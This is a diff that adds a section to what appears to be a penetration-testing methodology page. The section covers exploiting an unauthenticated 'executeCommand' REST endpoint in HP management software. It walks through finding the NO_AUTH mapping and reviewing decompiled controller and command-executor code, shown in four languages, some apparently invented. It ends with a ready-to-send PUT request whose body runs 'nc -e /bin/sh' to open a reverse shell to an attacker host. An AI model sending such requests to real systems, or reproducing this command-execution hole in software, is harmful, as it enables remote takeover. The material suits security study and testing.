@@ -1155,4 +1155,463 @@ Then send the request, and if a request is made to your server, the vulnerabilit
 
 ***
 
+#### Command Execution via Exposed Administrative API Endpoint
+
+{% stepper %}
+{% step %}
+Identify files related to API Mapping or Servlet Configuration (such as XML config files or `.config` files)
+
+```xml
+<api id="com.hp.ci.mgmt.guidpools.controllers.PoolController.executeCommand(HttpServletRequest,HttpServletResponse,ExecutableCommand,String,String,String)" method="PUT" uri="/rest/id-pools/executeCommand" internal-uri="/guidapp/rest/id-pools/executeCommand" public="false" no-cli="false" input-dto="com.hp.ci.mgmt.guidpools.guidserver.dto.ExecutableCommand" output-dto="com.hp.ci.mgmt.guidpools.guidserver.dto.ExecutableCommand">
+                    <requestHeader default="en_US" required="true" dto="java.lang.String" name="Accept-Language">
+                        <description default="true">
+            The language code requested in the response. If a suitable match to
+            the requested language is not available, en-US or the appliance locale is used.
+        </description>
+                    </requestHeader>
+                    <requestHeader required="false" dto="java.lang.String" name="Auth">
+                        <description default="true">
+            Session authorization token obtained from <a href="rest:resource:/rest/login-sessions">logging in</a>.  If this header is
+            not included or if the session-token is invalid, the response code will be 401 Unauthorized.
+        </description>
+                    </requestHeader>
+                    <requestHeader required="true" dto="java.lang.String" name="Content-Type" required-value="application/json">
+                        <description default="true">
+            The data format sent in the request body. If the Content-Type header is not provided, application/octet-stream
+            is assumed. Any value other than the required value will result in a response code of 415 Unsupported Media Type.
+        </description>
+                    </requestHeader>
+                    <requestHeader required="false" dto="java.lang.String" name="If-None-Match">
+                        <description default="true">
+            The request is conditionally processed only if the current ETag for the resource does not match the ETag passed in this
+            header. If the ETag specified in this header matches the resource's current ETag, the status code returned from the GET
+            will be 304 Not Modified.
+        </description>
+                    </requestHeader>
+                    <authInfo auth-type="NO_AUTH">
+                        <description default="true">
+            This API requires no authorization.
+        </description>
+                    </authInfo>
+                </api>
+```
+{% endstep %}
+
+{% step %}
+Review the file and look for endpoints or API routes in the application configuration that perform system command execution (such as `executeCommand`)
+{% endstep %}
+
+{% step %}
+Check whether authentication is disabled for the target API in the configuration
+{% endstep %}
+
+{% step %}
+Decompile the application files and search for the identified API
+{% endstep %}
+
+{% step %}
+Review the paths, controllers, and `RequestMapping` definitions associated with the target API request (i.e., `executeCommand`), and verify in the source code that authentication is not enforced for this API
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+using System;
+
+[..]
+
+[Controller("PoolController")]
+[Route("/id-pools")]
+[ResourceType("/rest/id-pools")]
+[..]
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+package com.hp.ci.mgmt.guidpools.controllers;
+
+import [..]
+
+@Controller("PoolController")
+@RequestMapping({"/id-pools"})
+@ResourceType("/rest/id-pools")
+[..]
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+<?php
+
+#[Controller("PoolController")]
+#[RequestMapping(["/id-pools"])]
+#[ResourceType("/rest/id-pools")]
+[..]
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+const [..] = require('[..]');
+
+@Controller("PoolController")
+@RequestMapping(["/id-pools"])
+@ResourceType("/rest/id-pools")
+[..]
+```
+{% endtab %}
+{% endtabs %}
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+[HttpPut]
+[Route("/executeCommand")]
+[ResponseStatus(HttpStatusCode.OK)]
+[ResponseBody]
+[DocAuthSpecial(SpecialAuthType.NO_AUTH)]
+public ExecutableCommand ExecuteCommand(
+    HttpRequest request,
+    HttpResponse response,
+    [FromBody] ExecutableCommand exeCmd,
+    [FromHeader(Name = "If-None-Match")] string eTag,
+    [FromHeader(Name = "accept-language")] string locale = "en_US",
+    [FromHeader] string auth = null
+)
+{
+    LOGGER.Info("Now executing the command {} as user trm7 ", new object[] { exeCmd.GetCmd() });
+
+    bool ret = this.runtimeExecutor.Execute(exeCmd.GetCmd());
+
+    LOGGER.Info("Completed executing the command {} as user trm7 and the status is {} ",
+        new object[] { exeCmd.GetCmd(), ret });
+
+    ExecutableCommand exe = new ExecutableCommand();
+    exe.SetCmd(exeCmd.GetCmd());
+    exe.SetResult(ret);
+
+    return exe;
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+@RequestMapping(
+        value = {"/executeCommand"},
+        method = {RequestMethod.PUT}
+    )
+    @ResponseStatus(HttpStatus.OK)
+    @ResponseBody
+    @DocAuthSpecial(SpecialAuthType.NO_AUTH)
+    public ExecutableCommand executeCommand(HttpServletRequest request, HttpServletResponse response, @RequestBody ExecutableCommand exeCmd, @RequestHeader(value = "If-None-Match",required = false) String eTag, @RequestHeader(value = "accept-language",defaultValue = "en_US") String locale, @RequestHeader(required = false) String auth) throws BaseException {
+        LOGGER.info("Now executing the command {} as user trm7 ", new Object[]{exeCmd.getCmd()});
+        boolean ret = this.runtimeExecutor.execute(exeCmd.getCmd());
+        LOGGER.info("Completed executing the command {} as user trm7 and the status is {} ", new Object[]{exeCmd.getCmd(), ret});
+        ExecutableCommand exe = new ExecutableCommand();
+        exe.setCmd(exeCmd.getCmd());
+        exe.setResult(ret);
+        return exe;
+    }
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+#[RequestMapping(
+        value: ["/executeCommand"],
+        method: [RequestMethod::PUT]
+    )]
+#[ResponseStatus(HttpStatus::OK)]
+#[ResponseBody]
+#[DocAuthSpecial(SpecialAuthType::NO_AUTH)]
+public function executeCommand(
+    HttpServletRequest $request,
+    HttpServletResponse $response,
+    #[RequestBody] ExecutableCommand $exeCmd,
+    #[RequestHeader(value: "If-None-Match", required: false)] ?string $eTag,
+    #[RequestHeader(value: "accept-language", defaultValue: "en_US")] string $locale,
+    #[RequestHeader(required: false)] ?string $auth
+): ExecutableCommand {
+    LOGGER::info("Now executing the command {} as user trm7 ", [$exeCmd->getCmd()]);
+
+    $ret = $this->runtimeExecutor->execute($exeCmd->getCmd());
+
+    LOGGER::info(
+        "Completed executing the command {} as user trm7 and the status is {} ",
+        [$exeCmd->getCmd(), $ret]
+    );
+
+    $exe = new ExecutableCommand();
+    $exe->setCmd($exeCmd->getCmd());
+    $exe->setResult($ret);
+
+    return $exe;
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+@RequestMapping({
+        value: ["/executeCommand"],
+        method: ["PUT"]
+    })
+@ResponseStatus("OK")
+@ResponseBody
+@DocAuthSpecial(SpecialAuthType.NO_AUTH)
+function executeCommand(
+    request,
+    response,
+    exeCmd,
+    eTag,
+    locale = "en_US",
+    auth
+) {
+    LOGGER.info("Now executing the command {} as user trm7 ", [exeCmd.getCmd()]);
+
+    const ret = this.runtimeExecutor.execute(exeCmd.getCmd());
+
+    LOGGER.info(
+        "Completed executing the command {} as user trm7 and the status is {} ",
+        [exeCmd.getCmd(), ret]
+    );
+
+    const exe = new ExecutableCommand();
+    exe.setCmd(exeCmd.getCmd());
+    exe.setResult(ret);
+
+    return exe;
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+In the source code of this endpoint, determine whether system commands are used to execute or process user input
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+using System;
+using System.Diagnostics;
+using System.Threading;
+
+namespace com.hp.ci.mgmt.guidpools.service
+{
+    [Scope("singleton")]
+    [Service("runtimeexecutor")]
+    public class RuntimeExecutorService
+    {
+        private static readonly DebugLog LOGGER = new DebugLog("guid-app", typeof(RuntimeExecutorService));
+
+        public RuntimeExecutorService()
+        {
+        }
+
+        public bool Execute(string command)
+        {
+            try
+            {
+                Process process = Process.Start(command);
+
+                Thread thread = new Thread(() =>
+                {
+                    try
+                    {
+                        process.WaitForExit();
+                        int returnCode = process.ExitCode;
+                        LOGGER.Info("Return code of command" + command + " = " + returnCode);
+                    }
+                    catch (ThreadInterruptedException exception)
+                    {
+                        LOGGER.Warn("InterruptedException while waiting for process", exception);
+                        Thread.CurrentThread.Interrupt();
+                    }
+                });
+
+                thread.Start();
+                return true;
+            }
+            catch (System.IO.IOException exception)
+            {
+                LOGGER.Warn("Error while execution of command " + command, exception);
+                return false;
+            }
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+package com.hp.ci.mgmt.guidpools.service;
+
+import com.hp.ci.mgmt.logs.debug.DebugLog;
+import java.io.IOException;
+import org.springframework.context.annotation.Scope;
+import org.springframework.stereotype.Service;
+
+@Scope("singleton")
+@Service("runtimeexecutor")
+public class RuntimeExecutorService {
+    private static final DebugLog LOGGER = new DebugLog("guid-app", RuntimeExecutorService.class);
+
+    public RuntimeExecutorService() {
+    }
+
+    public boolean execute(final String command) {
+        Runtime runtime = Runtime.getRuntime();
+
+        try {
+            final Process process = runtime.exec(command);
+            Thread thread = new Thread() {
+                public void run() {
+                    try {
+                        int returnCode = process.waitFor();
+                        RuntimeExecutorService.LOGGER.info("Return code of command" + command + " = " + returnCode);
+                    } catch (InterruptedException var2) {
+                        InterruptedException exception = var2;
+                        RuntimeExecutorService.LOGGER.warn("InterruptedException while waiting for process", exception);
+                        Thread.currentThread().interrupt();
+                    }
+
+                }
+            };
+            thread.start();
+            return true;
+        } catch (IOException var5) {
+            IOException exception = var5;
+            LOGGER.warn("Error while execution of command " + command, exception);
+            return false;
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+<?php
+
+namespace com\hp\ci\mgmt\guidpools\service;
+
+use com\hp\ci\mgmt\logs\debug\DebugLog;
+use Exception;
+
+#[Scope("singleton")]
+#[Service("runtimeexecutor")]
+class RuntimeExecutorService
+{
+    private static DebugLog $LOGGER;
+
+    public function __construct()
+    {
+    }
+
+    public function execute(string $command): bool
+    {
+        try {
+            $process = proc_open($command, [], $pipes);
+
+            $thread = function () use ($process, $command) {
+                try {
+                    $returnCode = proc_close($process);
+                    RuntimeExecutorService::$LOGGER->info(
+                        "Return code of command" . $command . " = " . $returnCode
+                    );
+                } catch (Exception $exception) {
+                    RuntimeExecutorService::$LOGGER->warn(
+                        "InterruptedException while waiting for process",
+                        $exception
+                    );
+                }
+            };
+
+            $thread();
+            return true;
+        } catch (Exception $exception) {
+            self::$LOGGER->warn(
+                "Error while execution of command " . $command,
+                $exception
+            );
+            return false;
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+const DebugLog = require('com/hp/ci/mgmt/logs/debug/DebugLog');
+
+@Scope("singleton")
+@Service("runtimeexecutor")
+class RuntimeExecutorService {
+    static LOGGER = new DebugLog("guid-app", RuntimeExecutorService);
+
+    constructor() {
+    }
+
+    execute(command) {
+        const { exec } = require('child_process');
+
+        try {
+            const process = exec(command);
+
+            const thread = async () => {
+                try {
+                    process.on('exit', (returnCode) => {
+                        RuntimeExecutorService.LOGGER.info(
+                            "Return code of command" + command + " = " + returnCode
+                        );
+                    });
+                } catch (exception) {
+                    RuntimeExecutorService.LOGGER.warn(
+                        "InterruptedException while waiting for process",
+                        exception
+                    );
+                }
+            };
+
+            thread();
+            return true;
+        } catch (exception) {
+            RuntimeExecutorService.LOGGER.warn(
+                "Error while execution of command " + command,
+                exception
+            );
+            return false;
+        }
+    }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Send a request to the target API with a JSON body containing system command values and obtain access
+
+```http
+PUT /rest/id-pools/executeCommand HTTP/1.1
+Host: 192.168.181.132
+accept-language: en_US
+X-API-Version: 3800
+Content-Type: application/json
+Content-Length: 61
+
+{
+"cmd":"nc -e /bin/sh 192.168.181.129 1337",
+"result":0
+}
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
 ## Cheat Sheet
